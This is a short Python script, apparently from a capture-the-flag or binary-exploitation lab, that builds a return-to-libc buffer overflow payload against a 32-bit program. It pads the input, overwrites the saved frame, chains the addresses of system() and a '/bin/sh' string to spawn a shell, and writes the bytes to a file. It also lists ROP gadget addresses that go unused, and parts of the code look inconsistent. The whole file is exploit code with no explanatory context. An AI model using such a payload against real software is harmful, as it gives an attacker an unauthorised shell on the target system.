#!/usr/bin/env python3
from struct import *
from subprocess import call

def conv(num):
    return pack("<I", num)


padding1 = "A"*20
padding2 = "B"*21
EBP = "C"*4
EIP = "G"*4
memset = conv(0x8048430)
strcpy = conv(0x80483e0)
puts = conv(0x80483f0)
words = conv(0x8048841)
binSh = conv(0xf7f48e49)
sys = conv(0xf7e26b30)


# gadgets:
learet = conv(0x80496ac)
popebx = conv(0x804939d)
popedi = conv(0x80497ce)  #: pop edi; pop ebp; ret
# putting it all together
exploit = padding1+padding2
exploit += EBP+sys+binSh

f = open("exploit", "w")
f.write(exploit)
f.close()
exit()
